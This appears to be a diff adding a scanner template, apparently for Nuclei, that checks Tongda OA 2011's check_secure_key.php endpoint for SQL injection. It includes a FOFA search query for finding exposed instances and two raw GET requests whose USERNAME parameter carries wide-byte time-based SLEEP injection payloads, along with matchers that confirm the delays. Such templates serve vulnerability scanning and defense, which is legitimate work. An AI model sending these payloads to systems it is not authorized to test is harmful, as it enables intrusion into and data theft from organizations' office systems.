@@ -1,0 +1,31 @@
+id: tongda-oa-check_secure_key-sqli
+info:
+  name: "通达 OA check_secure_key 接口存在 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
+      通达OA网络智能办公系统（北京通达信科科技有限公司研发的协同办公平台）的check_secure_key接口存在前端SQL注入缺陷。攻击者可通过构造恶意请求参数突破输入验证机制，实现对后台数据库的未授权访问与敏感数据提取。该漏洞影响2011版本的部署实例，潜在风险包括凭证泄露、数据篡改及系统权限提升。
+  tags: 通达OA
+http:
+- raw:
+  - |
+    GET /ispirit/check_secure_key.php?USERNAME=%df'+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%285%29%29%29vMBT%29--+NpkQ HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  - |
+    GET /ispirit/check_secure_key.php?USERNAME=%df'+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%288%29%29%29vMBT%29--+NpkQ HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
